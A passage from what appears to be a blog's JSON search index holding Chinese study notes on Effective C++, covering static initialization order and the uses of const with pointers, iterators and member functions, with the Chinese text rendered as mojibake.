0;&#125; 12345678910111213141516// Director.cpp#include &quot;Directory.h&quot;/** å‡è®¾æŸäº›å®¢æˆ·å»ºç«‹äº†ä¸€ä¸ª Directory ç±»ç”¨ä»¥å¤„ç†æ–‡ä»¶ç³»ç»Ÿå†…çš„ç›®å½•ã€‚ å¾ˆè‡ªç„¶ä»–ä»¬çš„ç±»ä¼šç”¨ä¸Š theFileSystem å¯¹è±¡ */Directory::Directory(const FileSystem &amp;tfs)&#123; std::size_t disks = tfs.numDisks(); // ä½¿ç”¨ tfs å¯¹è±¡ // ...&#125;Directory::~Directory()&#123;&#125; è¿™ä¹ˆä¿®æ”¹ä¹‹åï¼Œè¿™ä¸ªç³»ç»Ÿç¨‹åºçš„å®¢æˆ·å®Œå…¨åƒä»¥å‰ä¸€æ ·åœ°ç”¨å®ƒï¼Œå”¯ä¸€ä¸åŒçš„æ˜¯ä»–ä»¬ç°åœ¨ä½¿ç”¨ tfs() å’Œ tempDir() å‡½æ•°ï¼Œè€Œä¸å†æ˜¯ tfs å’Œ tempDir å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ä»–ä»¬ä½¿ç”¨å‡½æ•°è¿”å›çš„ â€œæŒ‡å‘é™æ€å¯¹è±¡â€ çš„å¼•ç”¨ï¼Œè€Œä¸å†ä½¿ç”¨å¯¹è±¡è‡ªèº«ã€‚ è¿™ç§ç»“æ„ä¸‹çš„è¿”å›å¼•ç”¨å‡½æ•°å¾€å¾€ååˆ†å•çº¯ï¼šç¬¬ä¸€è¡Œå®šä¹‰å¹¶åˆå§‹åŒ–ä¸€ä¸ªå±€éƒ¨é™æ€å¯¹è±¡ï¼Œç¬¬äºŒè¡Œè¿”å›å®ƒã€‚è¿™æ ·çš„å•çº¯æ€§å¾€å¾€ä½¿ç”¨å†…è”å‡½æ•°ï¼Œå°¤å…¶å¦‚æœå®ƒä»¬è¢«é¢‘ç¹è°ƒç”¨çš„è¯ï¼ˆè§å®éªŒã€Šé€å½»å†…è”ã€‹ï¼‰ã€‚ä½†æ˜¯ä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œè¿™äº›å‡½æ•° â€œå†…å«é™æ€å¯¹è±¡â€ çš„äº‹å®ä½¿å®ƒä»¬åœ¨å¤šçº¿ç¨‹ç³»ç»Ÿä¸­å¸¦æœ‰ä¸ç¡®å®šæ€§ã€‚å†è¯´ä¸€æ¬¡ï¼Œä»»ä½•ä¸€ç§éå¸¸é‡é™æ€å¯¹è±¡ï¼Œä¸è®ºå®ƒæ˜¯å±€éƒ¨æˆ–éå±€éƒ¨ï¼Œåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹å¾€å¾€éƒ½ä¼šå¾ˆéº»çƒ¦ã€‚å¤„ç†è¿™ä¸ªéº»çƒ¦çš„ä¸€ç§åšæ³•æ˜¯ï¼šåœ¨ç¨‹åºçš„å•çº¿ç¨‹å¯åŠ¨é˜¶æ®µæ‰‹å·¥è°ƒç”¨æ‰€æœ‰è¿”å›å¼•ç”¨å‡½æ•°ï¼Œè¿™å¯æ¶ˆé™¤ä¸åˆå§‹åŒ–æœ‰å…³çš„ â€œç«é€Ÿæ¡ä»¶ï¼ˆrace conditionsï¼‰â€ã€‚ ä¸ºé¿å…åœ¨å¯¹è±¡åˆå§‹åŒ–ä¹‹å‰è¿‡æ—©åœ°ä½¿ç”¨å®ƒä»¬ï¼Œä½ éœ€è¦åšä¸‰ä»¶äº‹ï¼š æ‰‹åŠ¨åˆå§‹åŒ–å†…ç½®å‹éæˆå‘˜å˜é‡ã€‚ ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨åˆå§‹åŒ–æˆå‘˜å˜é‡ã€‚ åœ¨åˆå§‹åŒ–é¡ºåºä¸ç¡®å®šæƒ…å†µä¸‹åŠ å¼ºè®¾è®¡ã€‚","tags":[{"name":"CPP/effectivecpp","slug":"CPP-effectivecpp","permalink":"https://hodlyounger.github.io/tags/CPP-effectivecpp/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"ã€ŠEfficient C++ã€‹","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠEfficient-C-ã€‹","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/%E3%80%8AEfficient-C-%E3%80%8B/"}]},{"title":"ã€Effective C++ã€‘<2> const å…³é”®å­—","date":"2023-10-27T01:24:02.449Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/ã€ŠEfficient C++ã€‹/ã€Effective CPPã€‘2_constå…³é”®å­—/","text":"[toc] const ä¿®é¥°æŒ‡é’ˆå˜é‡ å¯¹äºæŒ‡é’ˆï¼Œä½ å¯ä»¥æŒ‡å®šæŒ‡é’ˆæœ¬èº«æ˜¯å¦ä¸ºå¸¸é‡ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šæŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å®¹æ˜¯å¸¸é‡ï¼Œæˆ–ä¸¤è€…éƒ½æ˜¯ï¼Œæˆ–ä¸¤è€…éƒ½ä¸æ˜¯ã€‚ 1234567891011121314151617// constPointer.h#ifndef __CONSTPOINTER_H__#define __CONSTPOINTER_H__#include &lt;iostream&gt;char greeting[] = &quot;Hello&quot;;class Widget&#123;&#125;;void f1(const Widget *pw); // f1 è·å–ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¸¸é‡çš„ Widget å¯¹è±¡void f2(Widget const *pw); // f2 ç›¸åŒ#endif // __CONSTPOINTER_H__ 12345678910111213141516171819// constPointer.cpp#include &quot;constPointer.h&quot;int main()&#123; char *p1 = greeting; // éå¸¸é‡æŒ‡é’ˆ, éå¸¸é‡æ•°æ® const char *p2 = greeting; // éå¸¸é‡æŒ‡é’ˆ, å¸¸é‡æ•°æ® char const *p3 = greeting; // éå¸¸é‡æŒ‡é’ˆ, å¸¸é‡æ•°æ® char * const p4 = greeting; // å¸¸é‡æŒ‡é’ˆ, éå¸¸é‡æ•°æ® const char * const p5 = greeting; // å¸¸é‡æŒ‡é’ˆ, å¸¸é‡æ•°æ® std::cout &lt;&lt; &quot;p1 = &quot; &lt;&lt; p1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;p2 = &quot; &lt;&lt; p2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;p3 = &quot; &lt;&lt; p3 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;p4 = &quot; &lt;&lt; p4 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;p5 = &quot; &lt;&lt; p5 &lt;&lt; std::endl; return 0;&#125; æ€»ç»“ï¼šå¦‚æœ const å‡ºç°åœ¨æ˜Ÿå·çš„å·¦è¾¹ï¼Œé‚£ä¹ˆè¢«æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹å°±æ˜¯å¸¸é‡ï¼›å¦‚æœ const å‡ºç°åœ¨æ˜Ÿå·çš„å³è¾¹ï¼Œé‚£ä¹ˆæŒ‡é’ˆæœ¬èº«å°±æ˜¯å¸¸é‡ï¼›å¦‚æœ const å‡ºç°åœ¨æ˜Ÿå·ä¸¤è¾¹ï¼Œåˆ™è¡¨ç¤ºæŒ‡é’ˆå’ŒæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹éƒ½æ˜¯å¸¸é‡ã€‚ è¿­ä»£å™¨ä¸­çš„ const STL çš„è¿­ä»£å™¨æ˜¯ä»¥æŒ‡é’ˆä¸ºæ¨¡å‹çš„ï¼Œæ‰€ä»¥ä¸€ä¸ªè¿­ä»£å™¨çš„è¡Œä¸ºå¾ˆæƒ³ä¸€ä¸ªå’Œ T* æŒ‡é’ˆã€‚å£°æ˜ä¸€ä¸ªè¿­ä»£å™¨çš„å¸¸æ•°å°±åƒå£°æ˜ä¸€ä¸ªæŒ‡é’ˆçš„å¸¸é‡ï¼ˆå³å£°æ˜ä¸€ä¸ª T* å¸¸é‡æŒ‡é’ˆï¼‰ã€‚è¿­ä»£å™¨ä¸å…è®¸æŒ‡å‘ä¸åŒçš„å†…å®¹ï¼Œä½†å®ƒæŒ‡å‘çš„å†…å®¹å¯ä»¥è¢«ä¿®æ”¹ã€‚å¦‚æœä½ æƒ³è¦ä¸€ä¸ªè¿­ä»£å™¨æŒ‡å‘ä¸èƒ½è¢«ä¿®æ”¹çš„ä¸œè¥¿ï¼ˆå³ STL ç±»ä¼¼äºä¸€ä¸ª const T* æŒ‡é’ˆï¼‰ï¼Œåˆ™éœ€è¦ä¸€ä¸ª const_itreratorã€‚ 12345678910// constIterator.h#ifndef __CONSTITERATOR_H__#define __CONSTITERATOR_H__#include &lt;iostream&gt;#include &lt;vector&gt;std::vector&lt;int&gt; vec = &#123;1, 2, 3, 4, 5&#125;;#endif // __CONSTITERATOR_H__ 123456789101112131415161718192021222324252627282930// constIterator.cpp#include &quot;constIterator.h&quot;int main()&#123; // 1. æŒ‡é’ˆä¸ºéå¸¸é‡ï¼Œå†…å®¹ä¸ºéå¸¸é‡ std::vector&lt;int&gt;::iterator iter1 = vec.begin(); *iter1 = 10; // æ­£ç¡® ++iter1; // æ­£ç¡® // 2. æŒ‡é’ˆä¸ºå¸¸é‡ï¼Œå†…å®¹ä¸ºéå¸¸é‡ const std::vector&lt;int&gt;::iterator iter2 = vec.begin(); *iter2 = 10; // æ­£ç¡®ï¼Œ ä¿®æ”¹æŒ‡é’ˆæ‰€æŒ‡å†…å®¹ ++iter2; // é”™è¯¯ï¼Œiter2 ä¸ºå¸¸é‡æŒ‡é’ˆï¼Œä¸èƒ½ä¿®æ”¹ // 3. æŒ‡é’ˆä¸ºéå¸¸é‡ï¼Œå†…å®¹ä¸ºå¸¸é‡ std::vector&lt;int&gt;::const_iterator iter3 = vec.begin(); *iter3 = 10; // é”™è¯¯ï¼Œ *iter3 è¡¨ç¤ºæŒ‡é’ˆæ‰€æŒ‡å†…å®¹ä¸ºå¸¸é‡ï¼Œä¸èƒ½ä¿®æ”¹ ++iter3; // æ­£ç¡®ï¼ŒæŒ‡é’ˆéå¸¸é‡ï¼Œå¯ä»¥æ”¹å˜ // 4. æŒ‡é’ˆä¸ºå¸¸é‡ï¼Œå†…å®¹ä¸ºå¸¸é‡ const std::vector&lt;int&gt;::const_iterator iter4 = vec.begin(); *iter4 = 10; // é”™è¯¯ï¼Œ *iter4 è¡¨ç¤ºæŒ‡é’ˆæ‰€æŒ‡å†…å®¹ä¸ºå¸¸é‡ï¼Œä¸èƒ½ä¿®æ”¹ ++iter4; // é”™è¯¯ï¼Œiter4 ä¸ºå¸¸é‡æŒ‡é’ˆï¼Œä¸èƒ½ä¿®æ”¹ // 5. ç­‰æ•ˆäº std::vector&lt;int&gt;::const_iterator iter5 = vec.begin(); auto iter5 = vec.cbegin(); return 0;&#125; const ä¿®é¥°å‡½æ•°è¿”å›å€¼ åœ¨æˆå‘˜å‡½æ•°ä¸Šä½¿ç”¨ const çš„ç›®çš„æ˜¯ä¸ºäº†ç¡®å®šå“ªäº›æˆå‘˜å‡½æ•°å¯ä»¥åœ¨ constå¯¹è±¡ä¸Šè°ƒç”¨ã€‚è¿™æ ·çš„æˆå‘˜å‡½æ•°å¾ˆé‡è¦ï¼ŒåŸå› æœ‰äºŒã€‚é¦–å…ˆï¼Œå®ƒä»¬ä½¿ä¸€ä¸ªç±»çš„æ¥å£æ›´å®¹æ˜“ç†è§£ã€‚çŸ¥é“å“ªäº›å‡½æ•°å¯ä»¥ä¿®æ”¹ä¸€ä¸ªå¯¹è±¡ï¼Œå“ªäº›ä¸å¯ä»¥ï¼Œæ˜¯å¾ˆé‡è¦çš„ã€‚ç¬¬äºŒï¼Œå®ƒä»¬ä½¿æˆ‘ä»¬æœ‰å¯èƒ½ä¸å¸¸é‡å¯¹è±¡ä¸€èµ·å·¥ä½œã€‚è¿™æ˜¯ç¼–å†™é«˜æ•ˆä»£ç çš„ä¸€ä¸ªå…³é”®æ–¹é¢ï¼Œæé«˜ C++ ç¨‹åºæ€§èƒ½çš„åŸºæœ¬æ–¹æ³•ä¹‹ä¸€æ˜¯é€šè¿‡å¼•ç”¨åˆ°å¸¸é‡æ¥ä¼ é€’å¯¹è±¡ã€‚è¿™ç§æŠ€æœ¯åªæœ‰åœ¨æœ‰å¸¸é‡æˆå‘˜å‡½æ•°çš„æƒ…å†µä¸‹æ‰æ˜¯å¯è¡Œçš„ï¼Œå¯ä»¥ç”¨å®ƒæ¥å¤„ç†äº§ç”Ÿçš„å¸¸é‡é™å®šçš„å¯¹è±¡ã€‚ å…³äº const ä¿®é¥°æˆå‘˜å‡½æ•°ä¸»è¦è®²ä»¥ä¸‹ä¸‰ä¸ªçŸ¥è¯†ç‚¹ï¼š const ä¿®é¥°çš„æˆå‘˜å‡½æ•°å¯ä»¥è¢«é‡è½½ã€‚ å…³äº â€äºŒè¿›åˆ¶ä½å¸¸é‡æ€§â€œ ä¸ â€é€»è¾‘å¸¸é‡æ€§â€œã€‚ é¿å…é‡è½½è€Œå¯¼è‡´é‡å¤ä»£ç ã€‚ const ä¿®é¥°æˆå‘˜å˜é‡å¯ä»¥è¢«é‡è½½ 12345678910111213141516171819202122232425262728// overloadConst.h#ifndef __OVERLOADCONST_H__#define __OVERLOADCONST_H__#include &lt;iostream&gt;class TextBlock &#123;public: TextBlock(std::string t) : text(t) &#123;&#125; ~TextBlock() &#123;&#125; const char&amp; operator[](std::size_t position) const &#123; std::cout &lt;&lt; &quot;const char&amp; operator[](std::size_t position) const&quot; &lt;&lt; std::endl; return text[position]; &#125; char&amp; operator[](std::size_t position) &#123; std::cout &lt;&lt; &quot;char&amp; operator[](std::size_t position)&quot; &lt;&lt; std::endl; return text[position]; &#125;private: std::string text;&#125;;#endif // __OVERLOADCONST_H__ 123456789101112131415161718192021222324252627// overloadConst.cpp#include &quot;overloadConst.h&quot;// åœ¨å‡½æ•°ä¸­, ctb æ˜¯å¸¸é‡void print(const TextBlock&amp; ctb)&#123; // è°ƒç”¨ const TextBlock::operator[] std::cout &lt;&lt; ctb[0] &lt;&lt; std::endl; // ctb[0] = &#x27;x&#x27;; // é”™è¯¯ï¼Œä¸èƒ½ä¿®æ”¹ä¸€ä¸ªå¸¸é‡&#125;int main()&#123; // è°ƒç”¨ TextBlock::operator[] TextBlock tb(&quot;Hello&quot;); std::cout &lt;&lt; tb[0] &lt;&lt; std::endl; // æ­£ç¡®ï¼Œåªè¯»ä¸€ä¸ªéå¸¸é‡ tb[0] = &#x27;x&#x27;; // æ­£ç¡®ï¼Œä¿®æ”¹ä¸€ä¸ªéå¸¸é‡ // è°ƒç”¨ const TextBlock::operator[] const TextBlock ctb(&quot;World&quot;); std::cout &lt;&lt; ctb[0] &lt;&lt; std::endl; // æ­£ç¡®ï¼Œåªè¯»ä¸€ä¸ªå¸¸é‡ // ctb[0] = &#x27;x&#x27;; // é”™è¯¯ï¼Œä¸èƒ½ä¿®æ”¹ä¸€ä¸ªå¸¸é‡ print(tb); return 0;&#125; é€šè¿‡é‡è½½ operator[] å¹¶èµ‹äºˆä¸åŒç‰ˆæœ¬çš„è¿”å›å€¼ç±»å‹ï¼Œä½ å¯ä»¥å¯¹å¸¸é‡å’Œéå¸¸é‡ TextBlocks è¿›è¡Œä¸åŒçš„å¤„ç†ã€‚ å¸¸é‡å¯¹è±¡åœ¨å®é™…ç¨‹åºä¸­æœ€å¸¸å‡ºç°çš„æ˜¯é€šè¿‡æŒ‡é’ˆæˆ–å¼•ç”¨åˆ°å¸¸é‡çš„ç»“æœã€‚ä¾‹å¦‚ç¤ºä¾‹ä»£ç ä¸­çš„ void print(const TextBlock&amp; ctb) å‡½æ•°ã€‚ è¯·æ³¨æ„ï¼Œmain() å‡½æ•°ä¸­ ctb[0] = 'x'; çš„é”™è¯¯åªä¸è¢«è°ƒç”¨çš„ operator[] çš„è¿”å›ç±»å‹æœ‰å…³ï¼›å¯¹ operator[] æœ¬èº«çš„è°ƒç”¨éƒ½æ˜¯æ­£å¸¸çš„ã€‚é”™è¯¯æ˜¯ç”±äºè¯•å›¾å¯¹ const char&amp; è¿›è¡Œèµ‹å€¼ã€‚ operator[] çš„è¿”å›æ•°æ®ç±»å‹æ˜¯ char&amp;ï¼Œä¸æ˜¯ charã€‚å¦‚æœ operator[] å¦‚æœåªè¿”å›ä¸€ä¸ª charï¼Œæ˜¯ä¸ä¼šè¢«ç¼–è¯‘é€šè¿‡çš„ï¼Œå› ä¸ºä¿®æ”¹å†…ç½®æ•°æ®ç±»å‹çš„å‡½æ•°çš„è¿”å›å€¼æ˜¯ä¸åˆæ³•çš„ã€‚å³ä½¿å®ƒæ˜¯åˆæ³•çš„ï¼ŒC++ æŒ‰å€¼è¿”å›å¯¹è±¡çš„äº‹å®å°†æ„å‘³ç€ä¸€ä¸ª tb.text[0] çš„å‰¯æœ¬ä¼šè¢«ä¿®æ”¹ï¼Œè€Œä¸æ˜¯ tb.text[0] æœ¬èº«ã€‚ äºŒè¿›åˆ¶ä½å¸¸é‡æ€§ä¸é€»è¾‘å¸¸é‡æ€§ ä¸€ä¸ªæˆå‘˜å‡½æ•°ä¸ºå¸¸é‡æ„å‘³ç€ä»€ä¹ˆï¼Ÿæœ‰ä¸¤ä¸ªæ™®éçš„æ¦‚å¿µï¼šâ€œäºŒè¿›åˆ¶ä½å¸¸é‡æ€§â€ï¼ˆä¹Ÿç§°ä¸º â€œç‰©ç†å¸¸é‡æ€§â€ï¼‰å’Œ â€œé€»è¾‘å¸¸é‡æ€§â€ã€‚ äºŒè¿›åˆ¶ä½å¸¸é‡æ€§ â€äºŒè¿›åˆ¶ä½å¸¸é‡æ€§â€œ é˜µè¥è®¤ä¸ºï¼Œå½“ä¸”ä»…å½“ä¸€ä¸ªæˆå‘˜å‡½æ•°ä¸ä¿®æ”¹å¯¹è±¡çš„ä»»ä½•æ•°æ®æˆå‘˜ï¼ˆä¸åŒ…æ‹¬é™æ€æˆå‘˜ï¼‰æ—¶ï¼Œå®ƒæ‰æ˜¯å¸¸é‡ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸ä¿®æ”¹å¯¹è±¡å†…éƒ¨çš„ä»»ä½•æ¯”ç‰¹ä½ã€‚æ¯”ç‰¹æ’å®šæ€§çš„å¥½å¤„æ˜¯ï¼Œå®ƒå¾ˆå®¹æ˜“è¢«æ£€æµ‹åˆ°è¿è§„è¡Œä¸ºï¼Œç¼–è¯‘å™¨åªéœ€æŸ¥çœ‹å¯¹æ•°æ®æˆå‘˜çš„èµ‹å€¼ã€‚äº‹å®ä¸Šï¼Œé€ä½ä¸å˜æ€§æ˜¯ C++ å¯¹ä¸å˜æ€§çš„å®šä¹‰ï¼Œè€Œä¸”ä¸€ä¸ªå¸¸é‡æˆå‘˜å‡½æ•°ä¸å…è®¸ä¿®æ”¹å…¶æ‰€åœ¨å¯¹è±¡çš„ä»»ä½•éé™æ€æ•°æ®æˆå‘˜ã€‚ é—æ†¾çš„æ˜¯ï¼Œè®¸å¤šä¸æ€ä¹ˆè§„èŒƒçš„æˆå‘˜å‡½æ•°éƒ½é€šè¿‡äº†äºŒè¿›åˆ¶ä½å¸¸é‡æ€§æµ‹è¯•ã€‚ç‰¹åˆ«æ˜¯ï¼Œä¸€ä¸ªä¿®æ”¹äº† â€œæŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å®¹â€ çš„æˆå‘˜å‡½æ•°ç»å¸¸ä¸ç®—æ˜¯å¸¸é‡æˆå‘˜ã€‚ä½†å¦‚æœå¯¹è±¡ä¸­åªæœ‰æŒ‡é’ˆï¼Œé‚£ä¹ˆç§°è¯¥å‡½æ•°æ˜¯ â€œäºŒè¿›åˆ¶ä½å¸¸é‡æ€§â€ï¼Œç¼–è¯‘å™¨ä¹Ÿä¸ä¼šæœ‰å¼‚è®®ã€‚ä¾‹å¦‚ä¸‹é¢çš„ç¤ºä¾‹ä»£ç æ‰€ç¤ºï¼Œå‡è®¾æœ‰ä¸€ä¸ªç±»ä¼¼äº TextBlock çš„ç±»ï¼Œå®ƒå°†å…¶æ•°æ®å­˜å‚¨ä¸º char* ç±»å‹è€Œä¸æ˜¯ stringç±»å‹ï¼Œå› ä¸ºå®ƒéœ€è¦é€šè¿‡ä¸€ä¸ªä¸è®¤è¯† string å¯¹è±¡çš„ C API è¿›è¡Œäº¤äº’ã€‚ 12345678910111213141516171819202122232425// bitwise.h#ifndef __BITWISE_H__#define __BITWISE_H__#include &lt;iostream&gt;#include &lt;cstring&gt;class CTextBlock&#123;public: CTextBlock(std::string txt); ~CTextBlock(); // äºŒè¿›åˆ¶ä½å¸¸é‡æ€§å£°æ˜ï¼Œå®é™…å¹¶ä¸åˆé€‚ char&amp; operator[](std::size_t position) const &#123; return pText[position]; &#125;private: void release();private: char *pText;&#125;;#endif // __BITWISE_H__ 1234567891011121314151617181920212223242526272829303132333435// bitwise.cpp#include &quot;bitwise.h&quot;CTextBlock::CTextBlock(std::string txt) : pText(NULL)&#123; release(); int len = txt.length(); pText = new char[len + 1]; memset(pText, 0, len + 1); memcpy(pText, txt.data(), len);&#125;CTextBlock::~CTextBlock()&#123; release();&#125;void CTextBlock::release()&#123; if(pText != NULL) &#123; delete pText; pText = NULL; &#125;&#125;int main()&#123; const CTextBlock cctb(&quot;Hello&quot;); char *pc = &amp;cctb[0]; std::cout &lt;&lt; &quot;before modified: pc = &quot; &lt;&lt; *pc &lt;&lt; std::endl; *pc = &#x27;J&#x27;; std::cout &lt;&lt; &quot;after modified: pc = &quot; &lt;&lt; *pc &lt;&lt; std::endl; return 0;&#125; CTextBlock ç±»ï¼ˆä¸æ°å½“åœ°ï¼‰å°† operator[] å£°æ˜ä¸ºä¸€ä¸ªå¸¸é‡æˆå‘˜å‡½æ•°ï¼Œå°½ç®¡è¯¥å‡½æ•°è¿”å›çš„æ˜¯å¯¹å¯¹è±¡å†…éƒ¨æ•°æ®çš„å¼•ç”¨ã€‚æ³¨æ„åˆ° operator[] çš„å®ç°å¹¶æ²¡æœ‰ä»¥ä»»ä½•æ–¹å¼ä¿®æ”¹ pTextã€‚å› æ­¤ï¼Œç¼–è¯‘å™¨ä¼šå¾ˆä¹æ„ä¸º operator[] ç”Ÿæˆä»£ç ã€‚ ä½†æ˜¯æˆ‘ä»¬å´å‘ç°åœ¨ main() å‡½æ•°ä¸­ *pc = 'J'; å¯¹è¿”å›å€¼è¿›è¡Œäº†ä¿®æ”¹ï¼Œ*pc å¯æ˜¯è°ƒç”¨ operator[] åçš„è¿”å›å€¼ã€‚ é€»è¾‘å¸¸é‡æ€§ å‡ºç°ä¸Šé¢ â€œäºŒè¿›åˆ¶ä½å¸¸é‡æ€§â€ ç¤ºä¾‹ä»£ç ä¸­é—®é¢˜åå‡ºç°äº† â€œé€»è¾‘å¸¸é‡æ€§â€ æ´¾ã€‚ ä¸€ä¸ªå¸¸é‡æˆå‘˜å‡½æ•°å¯èƒ½ä¼šä¿®æ”¹å®ƒæ‰€è°ƒç”¨çš„å¯¹è±¡ä¸­çš„æ¯”ç‰¹ä½ï¼Œä½†åªæ˜¯ä»¥å®¢æˆ·ç«¯æ£€æµ‹ä¸åˆ°çš„æ–¹å¼ã€‚ä¾‹å¦‚ï¼Œå½“ä½ çš„ CTextBlock ç±»è¢«è¯·æ±‚åï¼Œå¯èƒ½æƒ³ç¼“å­˜æ–‡æœ¬å—çš„é•¿åº¦ã€‚ 12345678910111213141516171819// logic.h#ifndef __LOGIC_H__#define __LOGIC_H__#include &lt;iostream&gt;#include &lt;cstring&gt;class CTextBlock&#123;public: std::size_t length() const;private: char *pText; std::size_t textLength; // æœ€è¿‘ä¸€æ¬¡è®¡ç®—æ–‡æœ¬åŒºå—é•¿åº¦ bool lengthIsValid; // ç›®å‰é•¿åº¦æ˜¯å¦æœ‰æ•ˆ&#125;;#endif // __LOGIC_H__ 123456789101112// logic.cpp#include &quot;logic.h&quot;std::size_t CTextBlock::length() const&#123; if (!lengthIsValid) &#123; // é”™è¯¯ï¼Œconst æˆå‘˜å‡½æ•°å†…ä¸èƒ½ç»™ textLength å’Œ lengthIsValid èµ‹å€¼ textLength = std::strlen(pText); lengthIsValid = true; &#125; return textLength;&#125; length() çš„å®ç°ä¸æ˜¯ â€œäºŒè¿›åˆ¶ä½å¸¸é‡æ€§â€ï¼Œå› ä¸º textLength å’Œ lengthIsValid éƒ½å¯èƒ½è¢«ä¿®æ”¹ã€‚è¿™ä¸¤ä¸ªæ•°æ®è¢«ä¿®æ”¹å¯¹ const CTextBlock å¯¹è±¡è€Œè¨€è™½ç„¶å¯æ¥å—ï¼Œä½†ç¼–è¯‘å™¨ä¸åŒæ„ã€‚ è§£å†³åŠæ³•ä¹Ÿå¾ˆç®€å•ï¼Œåˆ©ç”¨ C++ çš„ä¸€ä¸ªä¸ const ç›¸å…³çš„æ‘†åŠ¨åœºï¼šmutableï¼ˆå¯å˜çš„ï¼‰ã€‚mutable é‡Šæ”¾æ‰éé™æ€æˆå‘˜å˜é‡çš„ â€œäºŒè¿›åˆ¶ä½å¸¸é‡æ€§â€ çº¦æŸã€‚ 12345678910111213141516171819// logic.h#ifndef __LOGIC_H__#define __LOGIC_H__#include &lt;iostream&gt;#include &lt;cstring&gt;class CTextBlock&#123;public: std::size_t length() const;private: char *pText; mutable std::size_t textLength; // æœ€è¿‘ä¸€æ¬¡è®¡ç®—æ–‡æœ¬åŒºå—é•¿åº¦ mutable bool lengthIsValid; // ç›®å‰é•¿åº¦æ˜¯å¦æœ‰æ•ˆ&#125;;#endif // __LOGIC_H__ é¿å…å¸¸é‡å’Œéå¸¸é‡æˆå‘˜é‡å¤ mutable æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œå®ƒè§£å†³äº†äºŒè¿›åˆ¶ä½å¸¸é‡æ€§éæˆ‘æ‰€æ¬²çš„é—®é¢˜ï¼Œä½†å®ƒå¹¶æ²¡æœ‰è§£å†³æ‰€æœ‰ä¸å¸¸é‡ç›¸å…³çš„å›°éš¾ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ TextBlockï¼ˆå’Œ CTextBlockï¼‰ä¸­çš„ operator[] ä¸ä»…è¿”å›å¯¹ç›¸åº”å­—ç¬¦çš„å¼•ç”¨ï¼Œå®ƒè¿˜æ‰§è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œè®°å½•è®¿é—®ä¿¡æ¯ï¼Œç”šè‡³å¯èƒ½è¿›è¡Œæ•°æ®å®Œæ•´æ€§éªŒè¯ã€‚æŠŠæ‰€æœ‰è¿™äº›æ”¾åœ¨å¸¸é‡å’Œéå¸¸é‡çš„ operator[] å‡½æ•°ä¸­ï¼ˆä¸è¦æ‹…å¿ƒï¼Œç°åœ¨æœ‰éšå¼å†…è”é•¿åº¦çš„å‡½æ•°â€“è§å®éªŒã€Šé€å½»å†…è”ã€‹ï¼‰ä¼šäº§ç”Ÿè¿™ç§æ€ªå¼‚çš„ç°è±¡ã€‚ 12345678910111213141516171819202122232425262728293031// avoidDuplication.h#ifndef __AVOIDDUPLICATION_H__#define __AVOIDDUPLICATION_H__#include &lt;iostream&gt;#include &lt;cstring&gt;class TextBlock&#123;public: const char&amp; operator[](std::size_t position) const &#123; // è¾¹ç•Œæ£€æŸ¥ // æ—¥å¿—æ•°æ®è®¿é—® // éªŒè¯æ•°æ®å®Œæ•´æ€§ return text[position]; &#125; char&amp; operator[](std::size_t position) &#123; // è¾¹ç•Œæ£€æŸ¥ // æ—¥å¿—æ•°æ®è®¿é—® // éªŒè¯æ•°æ®å®Œæ•´æ€§ return text[position]; &#125;private: std::string text;&#125;;#endif // __AVOIDDUPLICATION_H__ çœ‹åˆ°ä¸Šé¢ç¤ºä¾‹ä»£ç ï¼Œä½ èƒ½è¯´ä»£ç é‡å¤ï¼Œä»¥åŠéšä¹‹è€Œæ¥çš„ç¼–è¯‘æ—¶é—´ã€ç»´æŠ¤å’Œä»£ç æ¼æ´ç­‰é—®é¢˜å—ï¼Ÿå½“ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ‰€æœ‰çš„è¾¹ç•Œæ£€æŸ¥ç­‰ä»£ç ç§»åˆ°ä¸€ä¸ªå•ç‹¬çš„æˆå‘˜å‡½æ•°ä¸­ï¼ˆç§æœ‰çš„ï¼‰ï¼Œä¸¤ä¸ªç‰ˆæœ¬çš„ operator[] éƒ½ä¼šè°ƒç”¨ã€‚ä½†ä½ ä»ç„¶ä¼šé‡å¤è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¹¶ä¸”ä½ ä»ç„¶æœ‰é‡å¤çš„è¿”å›è¯­å¥ä»£ç ã€‚ ä½ çœŸæ­£æƒ³åšçš„æ˜¯å®ç°ä¸€æ¬¡ operator[] åŠŸèƒ½å¹¶ä½¿ç”¨å®ƒä¸¤æ¬¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ æƒ³è®©ä¸€ä¸ªç‰ˆæœ¬çš„ operator[] è°ƒç”¨ const operator[]ã€‚è¿™å°±ä½¿å¾—æˆ‘ä»¬éœ€è¦å»é™¤å¸¸é‡æ€§ã€‚ å»é‡å¤ä»£ç  